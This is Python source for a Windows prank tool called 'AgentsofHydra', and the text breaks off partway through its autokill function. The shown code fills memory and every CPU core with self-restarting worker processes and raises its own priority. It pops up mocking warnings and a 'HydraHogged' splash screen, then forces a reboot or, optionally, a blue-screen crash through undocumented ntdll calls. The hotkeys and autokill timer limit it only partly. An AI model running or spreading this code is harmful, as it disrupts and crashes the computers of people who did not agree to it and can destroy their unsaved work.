import queue
import os
import ctypes
import time
import multiprocessing
import threading
import logging
import random
import win32con
import win32gui
import win32api
import win32clipboard
import sys
import tkinter as tk
from tkinter import ttk, messagebox
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# ---------------- CONFIGURATION ----------------
ENABLE_SPLASH_SCREEN = True #optional-splash
SCRIPT_NAME = "AgentsofHydra"
RAM_TARGET_PERCENT = 10
RAM_WORKER_CHUNK_MB = 10
CPU_WORKERS = multiprocessing.cpu_count()
CRASH_TIMER_MINUTES = 10
ENABLE_LOGGING = True
HOTKEY_ID_PAUSE = 1
HOTKEY_ID_GUI = 2
ENABLE_BSOD = False 
ENABLE_AUTOKILL = True 
AUTOKILL_TIMER_MINUTES = 5  # shutdown script after this many minutes (cancels system restart)

# Enhanced GUI Colors and Styling
GUI_COLORS = {
    'primary': '#1B1F3B',       # Deep Indigo
    'accent': '#00F0FF',       # Neon Cyan  
    'highlight': '#8A2BE2',     # Ultraviolet Purple
    'glow': '#A7F0F9',         # Soft Electric Silver
    'dark_accent': '#0A0D1F',   # Darker variant
    'glass_overlay': '#1B1F3B'  
}

# UI Theme Settings
UI_THEMES = {
    'neon': {
        'bg': GUI_COLORS['primary'],
        'fg': GUI_COLORS['accent'],
        'accent': GUI_COLORS['highlight'],
        'glow': GUI_COLORS['glow']
    },
    'dark': {
        'bg': '#000000',
        'fg': '#FFFFFF',
        'accent': '#404040',
        'glow': '#606060'
    },
    'retro': {
        'bg': '#1a1a2e',
        'fg': '#16213e',
        'accent': '#e94560',
        'glow': '#f39c12'
    }
}

current_theme = 'neon'
glass_effect = True
neon_glow = True

# ---------------- LOGGING ----------------
if ENABLE_LOGGING:
    log_file = os.path.join(os.path.dirname(__file__), 'AgentsofHydra_log.txt')
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    logging.info("[INFO] hydraHog initialized. Let the feast begin.")

# ---------------- GLOBAL STATE ----------------
ram_processes = []
cpu_processes = []
is_paused = False
has_warned = False
crash_triggered = False
hogging_started = None
gui_visible = False
root = None
gui_vars = {}

# ---------------- LOGGING HANDLER FOR GUI ----------------
class TextHandler(logging.Handler):
    """This class allows you to log to a Tkinter Text widget using a queue."""
    def __init__(self, queue):
        logging.Handler.__init__(self)
        self.queue = queue

    def emit(self, record):
        msg = self.format(record)
        self.queue.put(msg)

# ---------------- RAM HOGGING ----------------
def ram_hog_worker(size_mb):
    try:
        chunk = bytearray(size_mb * 1024 * 1024)
        while True:
            for i in range(0, len(chunk), 4096):
                chunk[i] = (chunk[i] + 1) % 256
            time.sleep(0.05)
    except Exception as e:
        logging.error(f"[ERROR] RAM Goblin exploded: {e}")

def get_total_ram_mb():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]
    memory_status = MEMORYSTATUSEX()
    memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
    return memory_status.ullTotalPhys / (1024 * 1024)

def spawn_ram_hogs():
    global hogging_started, RAM_TARGET_PERCENT, RAM_WORKER_CHUNK_MB
    total_ram = get_total_ram_mb()
    target_ram = (total_ram * RAM_TARGET_PERCENT) / 100
    num_instances = int(target_ram / RAM_WORKER_CHUNK_MB)
    logging.info(f"[INFO] RAM hogging: Targeting {target_ram:.0f}MB with {num_instances} goblins")

    for _ in range(num_instances):
        p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
        p.daemon = True
        p.start()
        ram_processes.append(p)

    threading.Thread(target=monitor_ram_processes, daemon=True).start()
    hogging_started = time.time()

def monitor_ram_processes():
    global RAM_WORKER_CHUNK_MB
    while True:
        if not is_paused:
            for i, p in enumerate(ram_processes):
                if not p.is_alive():
                    logging.warning("[WARN] RAM Hog died. Restarting...")
                    new_p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
                    new_p.daemon = True
                    new_p.start()
                    ram_processes[i] = new_p
        time.sleep(1)

# ---------------- CPU HOGGING ----------------
def cpu_hog_worker():
    x = 0.0001
    while True:
        x = x ** 1.000001

def spawn_cpu_hogs():
    global CPU_WORKERS
    for _ in range(CPU_WORKERS):
        p = multiprocessing.Process(target=cpu_hog_worker)
        p.daemon = True
        p.start()
        cpu_processes.append(p)
    logging.info(f"[INFO] Spawned {CPU_WORKERS} CPU minions")
    threading.Thread(target=monitor_cpu_processes, daemon=True).start()

def monitor_cpu_processes():
    while True:
        if not is_paused:
            for i, p in enumerate(cpu_processes):
                if not p.is_alive():
                    logging.warning("[WARN] CPU hog died. Restarting...")
                    new_p = multiprocessing.Process(target=cpu_hog_worker)
                    new_p.daemon = True
                    new_p.start()
                    cpu_processes[i] = new_p
        time.sleep(1)

# Custom styled widgets
class GlassFrame(tk.Frame):
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.configure(
            bg=GUI_COLORS['glass_overlay'],
            relief='flat',
            bd=1,
            highlightthickness=1,
            highlightcolor=GUI_COLORS['glow'],
            highlightbackground=GUI_COLORS['glow']
        )

class NeonButton(tk.Button):
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.configure(
            bg=GUI_COLORS['primary'],
            fg=GUI_COLORS['accent'],
            activebackground=GUI_COLORS['highlight'],
            activeforeground=GUI_COLORS['glow'],
            relief='flat',
            bd=0,
            font=('Consolas', 10, 'bold'),
            cursor='hand2'
        )
        self.bind('<Enter>', self.on_enter)
        self.bind('<Leave>', self.on_leave)
        
    def on_enter(self, e):
        if neon_glow:
            self.configure(
                bg=GUI_COLORS['highlight'],
                fg=GUI_COLORS['glow'],
                relief='solid',
                bd=1
            )
    
    def on_leave(self, e):
        self.configure(
            bg=GUI_COLORS['primary'],
            fg=GUI_COLORS['accent'],
            relief='flat',
            bd=0
        )

class NeonLabel(tk.Label):
    def __init__(self, parent, glow=False, **kwargs):
        super().__init__(parent, **kwargs)
        self.glow = glow
        self.configure(
            bg=GUI_COLORS['primary'],
            fg=GUI_COLORS['glow'] if glow else GUI_COLORS['accent'],
            font=('Consolas', 10),
            anchor='w'
        )

class NeonSpinbox(tk.Spinbox):
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.configure(
            bg=GUI_COLORS['dark_accent'],
            fg=GUI_COLORS['accent'],
            insertbackground=GUI_COLORS['accent'],
            selectbackground=GUI_COLORS['highlight'],
            selectforeground=GUI_COLORS['glow'],
            relief='flat',
            bd=1,
            font=('Consolas', 9)
        )

def create_gui():
    global root, gui_vars

    root = tk.Tk()
    style = ttk.Style(root)
    style.theme_use('clam') 
    style.configure("Vertical.TScrollbar",
        gripcount=0,
        background=GUI_COLORS['highlight'],  
        darkcolor=GUI_COLORS['dark_accent'],
        lightcolor=GUI_COLORS['dark_accent'],
        troughcolor=GUI_COLORS['primary'],   
        bordercolor=GUI_COLORS['accent'],
        arrowcolor=GUI_COLORS['glow']
    )
    
    style.map("Vertical.TScrollbar",
        background=[('active', GUI_COLORS['glow'])]
    )

    root.title("◢ AGENTS OF HYDRA ◤")
    root.geometry("450x700")
    root.configure(bg=GUI_COLORS['primary'])
    root.minsize(350, 600)
    root.withdraw()
    
    if glass_effect:
        root.attributes('-alpha', 0.95)
    
    try:
        root.iconbitmap(default='')  
    except:
        pass
    
    root.protocol("WM_DELETE_WINDOW", hide_gui)

    main_container = GlassFrame(root)
    main_container.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
    
    canvas = tk.Canvas(main_container, bg=GUI_COLORS['primary'], highlightthickness=0)
    scrollbar = ttk.Scrollbar(main_container, orient='vertical', command=canvas.yview, style="Vertical.TScrollbar")

    scrollable_frame = tk.Frame(canvas, bg=GUI_COLORS['primary'])
    
    scrollable_frame.bind(
        '<Configure>',
        lambda e: canvas.configure(scrollregion=canvas.bbox('all'))
    )

    canvas.create_window((0, 0), window=scrollable_frame, anchor='nw')
    canvas.configure(yscrollcommand=scrollbar.set)

    frame_id = canvas.create_window((0, 0), window=scrollable_frame, anchor='nw')
    canvas.bind('<Configure>', lambda e: canvas.itemconfig(frame_id, width=e.width))
    
    canvas.pack(side='left', fill='both', expand=True)
    scrollbar.pack(side='right', fill='y')
    
    def on_mousewheel(event):
        canvas.yview_scroll(int(-1*(event.delta/120)), "units")
    canvas.bind_all("<MouseWheel>", on_mousewheel)

    # === HEADER SECTION ===
    header_frame = GlassFrame(scrollable_frame, bg=GUI_COLORS['dark_accent'])
    header_frame.pack(fill=tk.X, padx=10, pady=10)
    
    title_label = NeonLabel(header_frame, text="◢◤ AGENTS OF HYDRA ◥◣", 
                           glow=True, font=('Consolas', 16, 'bold'))
    title_label.pack(pady=15)
    
    separator = tk.Frame(header_frame, height=2, bg=GUI_COLORS['accent'])
    separator.pack(fill=tk.X, padx=20, pady=5)
    
    # === THEME CUSTOMIZATION SECTION ===
    theme_frame = GlassFrame(scrollable_frame, bg=GUI_COLORS['glass_overlay'])
    theme_frame.pack(fill=tk.X, padx=10, pady=5)
    
    theme_title = NeonLabel(theme_frame, text="▼ UI CUSTOMIZATION", 
                           font=('Consolas', 11, 'bold'))
    theme_title.pack(pady=5)
    
    theme_controls = tk.Frame(theme_frame, bg=GUI_COLORS['primary'])
    theme_controls.pack(fill=tk.X, padx=10, pady=5)
    
    tk.Label(theme_controls, text="Theme:", bg=GUI_COLORS['primary'], 
             fg=GUI_COLORS['accent'], font=('Consolas', 9)).pack(side=tk.LEFT)
    
    gui_vars['theme_var'] = tk.StringVar(value=current_theme)
    theme_combo = ttk.Combobox(theme_controls, textvariable=gui_vars['theme_var'],
                              values=list(UI_THEMES.keys()), state='readonly', width=10)
    theme_combo.pack(side=tk.RIGHT, padx=5)
    theme_combo.bind('<<ComboboxSelected>>', lambda e: apply_theme())
    
    effects_frame = tk.Frame(theme_frame, bg=GUI_COLORS['primary'])
    effects_frame.pack(fill=tk.X, padx=10, pady=5)
    
    gui_vars['glass_var'] = tk.BooleanVar(value=glass_effect)
    glass_check = tk.Checkbutton(effects_frame, text="Glass Effect", 
                                variable=gui_vars['glass_var'],
                                bg=GUI_COLORS['primary'], fg=GUI_COLORS['accent'],
                                selectcolor=GUI_COLORS['dark_accent'],
                                activebackground=GUI_COLORS['primary'],
                                command=toggle_glass_effect)
    glass_check.pack(side=tk.LEFT)
    
    gui_vars['glow_var'] = tk.BooleanVar(value=neon_glow)
    glow_check = tk.Checkbutton(effects_frame, text="Neon Glow", 
                               variable=gui_vars['glow_var'],
                               bg=GUI_COLORS['primary'], fg=GUI_COLORS['accent'],
                               selectcolor=GUI_COLORS['dark_accent'],
                               activebackground=GUI_COLORS['primary'],
                               command=toggle_neon_glow)
    glow_check.pack(side=tk.RIGHT)

    # === STATUS SECTION ===
    status_frame = GlassFrame(scrollable_frame, bg=GUI_COLORS['glass_overlay'])
    status_frame.pack(fill=tk.X, padx=10, pady=5)
    
    status_title = NeonLabel(status_frame, text="▼ SYSTEM STATUS", 
                           font=('Consolas', 11, 'bold'))
    status_title.pack(pady=5)
    
    status_grid = tk.Frame(status_frame, bg=GUI_COLORS['primary'])
    status_grid.pack(fill=tk.X, padx=10, pady=5)
    
    left_status = tk.Frame(status_grid, bg=GUI_COLORS['primary'])
    left_status.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    
    gui_vars['status_label'] = NeonLabel(left_status, text="● Running", glow=True)
    gui_vars['status_label'].pack(anchor='w', pady=2)
    
    gui_vars['time_label'] = NeonLabel(left_status, text="⏱ 00:00:00")
    gui_vars['time_label'].pack(anchor='w', pady=2)
    
    right_status = tk.Frame(status_grid, bg=GUI_COLORS['primary'])
    right_status.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
    
    if HAS_PSUTIL:
        gui_vars['ram_label'] = NeonLabel(right_status, text="▓ RAM: 0%")
        gui_vars['ram_label'].pack(anchor='e', pady=2)
        
        gui_vars['cpu_label'] = NeonLabel(right_status, text="⚡ CPU: 0%")
        gui_vars['cpu_label'].pack(anchor='e', pady=2)
    
    countdown_frame = tk.Frame(status_frame, bg=GUI_COLORS['primary'])
    countdown_frame.pack(fill=tk.X, padx=10, pady=5)
    
    gui_vars['autokill_countdown'] = NeonLabel(countdown_frame, text="🔥 Autokill: N/A", 
                                              fg=GUI_COLORS['highlight'])
    gui_vars['autokill_countdown'].pack(anchor='w', pady=1)
    
    gui_vars['crash_countdown'] = NeonLabel(countdown_frame, text="💥 Crash: N/A", 
                                           fg=GUI_COLORS['highlight'])
    gui_vars['crash_countdown'].pack(anchor='w', pady=1)

    # === CONFIGURATION SECTION ===
    config_frame = GlassFrame(scrollable_frame, bg=GUI_COLORS['glass_overlay'])
    config_frame.pack(fill=tk.X, padx=10, pady=5)
    
    config_title = NeonLabel(config_frame, text="▼ CONFIGURATION", 
                           font=('Consolas', 11, 'bold'))
    config_title.pack(pady=5)
    
    config_grid = tk.Frame(config_frame, bg=GUI_COLORS['primary'])
    config_grid.pack(fill=tk.X, padx=10, pady=5)
    
    config_items = [
        ("RAM Target %:", 'ram_target', RAM_TARGET_PERCENT, 10, 95),
        ("RAM Chunk MB:", 'ram_chunk', RAM_WORKER_CHUNK_MB, 50, 500),
        ("CPU Workers:", 'cpu_workers', CPU_WORKERS, 1, 32),
        ("Crash Timer (min):", 'crash_timer', CRASH_TIMER_MINUTES, 1, 60),
        ("Autokill Timer (min):", 'autokill_timer', AUTOKILL_TIMER_MINUTES, 1, 30)
    ]
    
    for i, (label, var_name, default, min_val, max_val) in enumerate(config_items):
        row = tk.Frame(config_grid, bg=GUI_COLORS['primary'])
        row.pack(fill=tk.X, pady=3)
        
        tk.Label(row, text=label, bg=GUI_COLORS['primary'], 
                fg=GUI_COLORS['accent'], font=('Consolas', 9)).pack(side=tk.LEFT)
        
        gui_vars[var_name] = NeonSpinbox(row, from_=min_val, to=max_val, 
                                        value=default, width=8)
        gui_vars[var_name].pack(side=tk.RIGHT)
    
    checkbox_frame = tk.Frame(config_frame, bg=GUI_COLORS['primary'])
    checkbox_frame.pack(fill=tk.X, padx=10, pady=5)
    
    checkboxes = [
        ("🔴 Enable BSOD", 'enable_bsod', ENABLE_BSOD),
        ("⚡ Enable Autokill", 'enable_autokill', ENABLE_AUTOKILL),
        ("📝 Enable Logging", 'enable_logging', ENABLE_LOGGING)
    ]
    
    for text, var_name, default in checkboxes:
        gui_vars[var_name] = tk.BooleanVar(value=default)
        check = tk.Checkbutton(checkbox_frame, text=text, 
                              variable=gui_vars[var_name],
                              bg=GUI_COLORS['primary'], fg=GUI_COLORS['accent'],
                              selectcolor=GUI_COLORS['dark_accent'],
                              activebackground=GUI_COLORS['primary'],
                              font=('Consolas', 9))
        check.pack(anchor='w', pady=2)

    # === CONTROLS SECTION ===
    controls_frame = GlassFrame(scrollable_frame, bg=GUI_COLORS['glass_overlay'])
    controls_frame.pack(fill=tk.X, padx=10, pady=5)
    
    controls_title = NeonLabel(controls_frame, text="▼ CONTROLS", 
                              font=('Consolas', 11, 'bold'))
    controls_title.pack(pady=5)
    
    button_container = tk.Frame(controls_frame, bg=GUI_COLORS['primary'])
    button_container.pack(fill=tk.X, padx=10, pady=5)
    
    primary_buttons = tk.Frame(button_container, bg=GUI_COLORS['primary'])
    primary_buttons.pack(fill=tk.X, pady=5)
    
    apply_btn = NeonButton(primary_buttons, text="⚙ Apply Settings", 
                          command=apply_settings)
    apply_btn.pack(fill=tk.X, pady=2)
    
    gui_vars['pause_btn'] = NeonButton(primary_buttons, text="⏸ Pause", 
                                      command=toggle_pause)
    gui_vars['pause_btn'].pack(fill=tk.X, pady=2)
    
    secondary_buttons = tk.Frame(button_container, bg=GUI_COLORS['primary'])
    secondary_buttons.pack(fill=tk.X, pady=5)
    
    restart_btn = NeonButton(secondary_buttons, text="🔄 Trigger Restart", 
                            command=manual_restart)
    restart_btn.configure(bg=GUI_COLORS['highlight'])
    restart_btn.pack(fill=tk.X, pady=2)
    
    exit_btn = NeonButton(secondary_buttons, text="❌ Exit Script", 
                         command=exit_script)
    exit_btn.configure(bg=GUI_COLORS['highlight'])
    exit_btn.pack(fill=tk.X, pady=2)
    
    hide_btn = NeonButton(secondary_buttons, text="👁 Hide GUI (Ctrl+Alt+G)", 
                         command=hide_gui)
    hide_btn.pack(fill=tk.X, pady=2)

    # === LOGGING CONSOLE (COLLAPSIBLE) ===
    log_frame_container = tk.Frame(scrollable_frame, bg=GUI_COLORS['primary'])
    log_frame_container.pack(fill=tk.X, padx=10, pady=5)

    def toggle_log_console():
        if log_frame.winfo_viewable():
            log_frame.pack_forget()
            log_toggle_btn.config(text="▼ Show Logs")
        else:
            log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
            log_toggle_btn.config(text="▲ Hide Logs")

    log_toggle_btn = NeonButton(log_frame_container, text="▼ Show Logs", command=toggle_log_console)
    log_toggle_btn.pack(fill=tk.X)

    log_frame = GlassFrame(log_frame_container)

    log_text = tk.Text(log_frame, height=10, state='disabled', wrap=tk.WORD,
                       bg=GUI_COLORS['dark_accent'], fg=GUI_COLORS['glow'],
                       relief='flat', font=('Consolas', 8),
                       highlightthickness=1, highlightcolor=GUI_COLORS['accent'])
    log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=2, pady=2)

    log_scroll = ttk.Scrollbar(log_frame, orient='vertical', command=log_text.yview, style="Vertical.TScrollbar")
    log_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    log_text['yscrollcommand'] = log_scroll.set

    log_queue = queue.Queue()
    text_handler = TextHandler(log_queue)
    log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%H:%M:%S')
    text_handler.setFormatter(log_formatter)
    logging.getLogger().addHandler(text_handler)
    logging.getLogger().setLevel(logging.INFO)

    def poll_log_queue():
        """Check the queue for new messages and update the text widget."""
        try:
            while True:
                record = log_queue.get(block=False)
                log_text.configure(state='normal')
                log_text.insert(tk.END, record + '\n')
                log_text.configure(state='disabled')
                log_text.yview(tk.END)
        except queue.Empty:
            pass
        root.after(100, poll_log_queue)

    poll_log_queue()

    # === FOOTER ===
    footer_frame = tk.Frame(scrollable_frame, bg=GUI_COLORS['primary'])
    footer_frame.pack(fill=tk.X, padx=10, pady=10)
    
    footer_separator = tk.Frame(footer_frame, height=1, bg=GUI_COLORS['accent'])
    footer_separator.pack(fill=tk.X, pady=5)
    
    footer_label = NeonLabel(footer_frame, text="◢ Hydra Protocol Active ◤", 
                           font=('Consolas', 8), fg=GUI_COLORS['glow'])
    footer_label.pack()
    
    update_status()
    animate_separator(separator)
    
    return root

def show_splash_screen(parent):
    """Creates and displays a timed splash screen."""
    splash_duration = 30000 # in milliseconds (30 seconds)

    splash = tk.Toplevel(parent)
    splash.overrideredirect(True) # Borderless window
    splash.configure(bg=GUI_COLORS['primary'])
    
    # ASCII Art for HydraHog
    hog_art = r"""
      ,#####,
     #_   _#
        | o` 'o |  
                |   ^   |   Grrr...
        |  (_)  |   
       /|       |\  
      /_|__|_|__|_\
     /__|  | |  |__\
        \_/   \_/
        //       \\
       ||         ||
      (__)       (__)
    """
    
    message_text = "You've been HydraHogged :)"

    # Center the splash screen
    parent_width = parent.winfo_screenwidth()
    parent_height = parent.winfo_screenheight()
    splash_width = 300
    splash_height = 350
    x = (parent_width // 2) - (splash_width // 2)
    y = (parent_height // 2) - (splash_height // 2)
    splash.geometry(f'{splash_width}x{splash_height}+{x}+{y}')

    # Add content
    tk.Label(splash, text=hog_art, font=('Consolas', 10, 'bold'), 
             fg=GUI_COLORS['accent'], bg=GUI_COLORS['primary']).pack(pady=(20, 10))
             
    tk.Label(splash, text=message_text, font=('Consolas', 12, 'bold'), 
             fg=GUI_COLORS['glow'], bg=GUI_COLORS['primary']).pack(pady=10)

    # Make it stay on top
    splash.attributes('-topmost', True)

    # Schedule its destruction
    splash.after(splash_duration, splash.destroy)
    
def apply_settings():
    global RAM_TARGET_PERCENT, RAM_WORKER_CHUNK_MB, CPU_WORKERS
    global CRASH_TIMER_MINUTES, AUTOKILL_TIMER_MINUTES
    global ENABLE_BSOD, ENABLE_AUTOKILL, ENABLE_LOGGING
    global is_paused

    try:
        RAM_TARGET_PERCENT = int(gui_vars['ram_target'].get())
        RAM_WORKER_CHUNK_MB = int(gui_vars['ram_chunk'].get())
        CPU_WORKERS = int(gui_vars['cpu_workers'].get())
        CRASH_TIMER_MINUTES = int(gui_vars['crash_timer'].get())
        AUTOKILL_TIMER_MINUTES = int(gui_vars['autokill_timer'].get())
        ENABLE_BSOD = gui_vars['enable_bsod'].get()
        ENABLE_AUTOKILL = gui_vars['enable_autokill'].get()
        ENABLE_LOGGING = gui_vars['enable_logging'].get()

        logging.info("[INFO] Settings applied from GUI")
        messagebox.showinfo("Settings Applied", "Configuration updated successfully!")

        if ENABLE_AUTOKILL and not ENABLE_BSOD:
            threading.Thread(target=autokill_timer, daemon=True).start()

        # Auto pause and resume to apply new values
        if not is_paused:
            logging.info("[INFO] Auto-restarting hogging to apply changes.")
            toggle_pause()
            time.sleep(0.5)
            toggle_pause()

    except ValueError:
        messagebox.showerror("Error", "Invalid input values!")

def manual_restart():
    if messagebox.askyesno("Confirm Restart", "Are you sure you want to restart the system?"):
        trigger_restart()

def exit_script():
    if messagebox.askyesno("Confirm Exit", "Are you sure you want to exit the script?"):
        for p in ram_processes + cpu_processes:
            if p.is_alive():
                p.terminate()
        os._exit(0)

def show_gui():
    global gui_visible
    if root and not gui_visible:
        try:
            root.deiconify()
            root.lift()
            gui_visible = True
        except RuntimeError:
            logging.warning("[WARN] Tried to show GUI but it's already closed.")

def hide_gui():
    global gui_visible
    if root and gui_visible:
        try:
            root.withdraw()
            gui_visible = False
        except RuntimeError:
            logging.warning("[WARN] Tried to hide GUI but it's already closed.")
            gui_visible = False

def toggle_gui():
    if gui_visible:
        hide_gui()
    else:
        show_gui()

def apply_theme():
    global current_theme
    current_theme = gui_vars['theme_var'].get()
    theme = UI_THEMES[current_theme]
    
    # Update GUI_COLORS with selected theme
    GUI_COLORS.update({
        'primary': theme['bg'],
        'accent': theme['fg'],
        'highlight': theme['accent'],
        'glow': theme['glow']
    })
    
    # Refresh GUI appearance
    refresh_gui_colors()

def toggle_glass_effect():
    global glass_effect
    glass_effect = gui_vars['glass_var'].get()
    if root:
        root.attributes('-alpha', 0.95 if glass_effect else 1.0)

def toggle_neon_glow():
    global neon_glow
    neon_glow = gui_vars['glow_var'].get()

def refresh_gui_colors():
    """Refresh all GUI colors after theme change"""
    if root:
        root.configure(bg=GUI_COLORS['primary'])
        update_widget_colors(root)

def update_widget_colors(widget):
    """Recursively update widget colors"""
    try:
        if isinstance(widget, (tk.Frame, tk.Label, tk.Button)):
            widget.configure(bg=GUI_COLORS['primary'])
        for child in widget.winfo_children():
            update_widget_colors(child)
    except:
        pass

def animate_separator(separator):
    """Animate the separator bar"""
    colors = [GUI_COLORS['accent'], GUI_COLORS['highlight'], GUI_COLORS['glow']]
    current_color = [0]
    
    def change_color():
        if separator.winfo_exists():
            separator.configure(bg=colors[current_color[0]])
            current_color[0] = (current_color[0] + 1) % len(colors)
            separator.after(2000, change_color)
    
    change_color()

def update_status():
    if root:
        # Update pause button with neon styling
        if 'pause_btn' in gui_vars:
            if is_paused:
                gui_vars['pause_btn'].config(text="▶ Resume", 
                                           bg=GUI_COLORS['highlight'])
            else:
                gui_vars['pause_btn'].config(text="⏸ Pause", 
                                           bg=GUI_COLORS['primary'])

        if 'status_label' in gui_vars:
            if is_paused:
                gui_vars['status_label'].config(text="⏸ Paused", 
                                              fg=GUI_COLORS['highlight'])
            else:
                gui_vars['status_label'].config(text="● Running", 
                                              fg=GUI_COLORS['glow'])

        if 'time_label' in gui_vars and hogging_started:
            elapsed = time.time() - hogging_started
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            gui_vars['time_label'].config(text=f"⏱ {hours:02d}:{minutes:02d}:{seconds:02d}")

            if 'autokill_countdown' in gui_vars and ENABLE_AUTOKILL and not ENABLE_BSOD:
                remaining = AUTOKILL_TIMER_MINUTES * 60 - elapsed
                if remaining > 0:
                    m, s = divmod(int(remaining), 60)
                    gui_vars['autokill_countdown'].config(text=f"🔥 Autokill: {m:02d}:{s:02d}")
                else:
                    gui_vars['autokill_countdown'].config(text="🔥 Autokill: NOW", 
                                                         fg=GUI_COLORS['highlight'])

            if 'crash_countdown' in gui_vars:
                remaining = CRASH_TIMER_MINUTES * 60 - elapsed
                if remaining > 0:
                    m, s = divmod(int(remaining), 60)
                    gui_vars['crash_countdown'].config(text=f"💥 Crash: {m:02d}:{s:02d}")
                else:
                    gui_vars['crash_countdown'].config(text="💥 Crash: NOW", 
                                                      fg=GUI_COLORS['highlight'])

        if HAS_PSUTIL:
            if 'ram_label' in gui_vars:
                ram_percent = psutil.virtual_memory().percent
                color = GUI_COLORS['highlight'] if ram_percent > 80 else GUI_COLORS['accent']
                gui_vars['ram_label'].config(text=f"▓ RAM: {ram_percent:.1f}%", fg=color)

            if 'cpu_label' in gui_vars:
                cpu_percent = psutil.cpu_percent(interval=None)
                color = GUI_COLORS['highlight'] if cpu_percent > 80 else GUI_COLORS['accent']
                gui_vars['cpu_label'].config(text=f"⚡ CPU: {cpu_percent:.1f}%", fg=color)

        root.after(1000, update_status)

# ---------------- HOTKEY ----------------
def toggle_pause():
    global is_paused, hogging_started
    is_paused = not is_paused
    if is_paused:
        logging.info("[INFO] Paused.")
        for p in ram_processes + cpu_processes:
            if p.is_alive():
                p.terminate()
        ram_processes.clear()
        cpu_processes.clear()
        hogging_started = None
    else:
        logging.info("[INFO] Resuming hogging.")
        spawn_ram_hogs()
        spawn_cpu_hogs()

def handle_hotkeys():
    def wnd_proc(hWnd, msg, wParam, lParam):
        if msg == win32con.WM_HOTKEY:
            if wParam == HOTKEY_ID_PAUSE:
                toggle_pause()
            elif wParam == HOTKEY_ID_GUI:
                toggle_gui()
        return win32gui.DefWindowProc(hWnd, msg, wParam, lParam)

    wc = win32gui.WNDCLASS()
    hinst = wc.hInstance = win32api.GetModuleHandle(None)
    wc.lpszClassName = "HotkeyListener"
    wc.lpfnWndProc = wnd_proc
    class_atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(wc.lpszClassName, "", 0, 0, 0, 0, 0, 0, 0, hinst, None)

    win32gui.RegisterHotKey(hwnd, HOTKEY_ID_PAUSE, win32con.MOD_CONTROL | win32con.MOD_ALT, 0x50)  # Ctrl+Alt+P
    win32gui.RegisterHotKey(hwnd, HOTKEY_ID_GUI, win32con.MOD_CONTROL | win32con.MOD_ALT, 0x47)     # Ctrl+Alt+G
    logging.info("[INFO] Hotkeys bound: CTRL+ALT+P (pause), CTRL+ALT+G (GUI)")

    win32gui.PumpMessages()

# ---------------- PRIORITY ----------------
def raise_priority():
    try:
        ctypes.windll.kernel32.SetPriorityClass(
            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080
        )
        logging.info("[INFO] Raised process priority.")
    except Exception as e:
        logging.warning(f"[WARN] Priority change failed: {e}")

# ---------------- WARNINGS ----------------
WARNING_MESSAGES = [
    "RAM's in hospice. Last rites incoming.",
    "Your PC is melting faster than your dreams.",
    "System performance dropped harder than crypto.",
    "RAM is screaming. CPU left the chat.",
    "Memory flushed. Performance? Gone with the wind."
]

def warning_loop():
    global has_warned
    while True:
        if not is_paused and not has_warned:
            msg = random.choice(WARNING_MESSAGES)
            ctypes.windll.user32.MessageBoxW(0, msg, "System Breakdown Approaching", 0x30)
            has_warned = True
        time.sleep(5)

# ---------------- CRASH/RESTART ----------------
def crash_timer():
    global crash_triggered, CRASH_TIMER_MINUTES, AUTOKILL_TIMER_MINUTES
    global ENABLE_BSOD, ENABLE_AUTOKILL
    while True:
        if hogging_started and not is_paused:
            elapsed = time.time() - hogging_started
            if ENABLE_AUTOKILL and not ENABLE_BSOD and AUTOKILL_TIMER_MINUTES < CRASH_TIMER_MINUTES:
                logging.info("[INFO] Skipping crash due to active autokill")
                return
            if elapsed > CRASH_TIMER_MINUTES * 60 and not crash_triggered:
                crash_triggered = True
                if ENABLE_BSOD:
                    logging.warning("[WARN] Time's up. Triggering BSOD...")
                    trigger_bsod()
                else:
                    logging.warning("[WARN] Time's up. Restarting system...")
                    trigger_restart()
        time.sleep(5)

def trigger_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_long()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
    except Exception as e:
        logging.error(f"[ERROR] BSOD failed: {e}")

def trigger_restart():
    try:
        os.system("shutdown /r /t 5")
    except Exception as e:
        logging.error(f"[ERROR] Restart failed: {e}")

# ---------------- AUTOKILL ----------------
def autokill_timer():
    global ENABLE_AUTOKILL, ENABLE_BSOD, AUTOKILL_TIMER_MINUTES, CRASH_TIMER_MINUTES
    if ENABLE_AUTOKILL and not ENABLE_BSOD:
        if AUTOKILL_TIMER_MINUTES >= CRASH_TIMER_MINUTES:
            logging.warning("[WARN] Autokill timer must be shorter than crash timer to be effective.")
            return
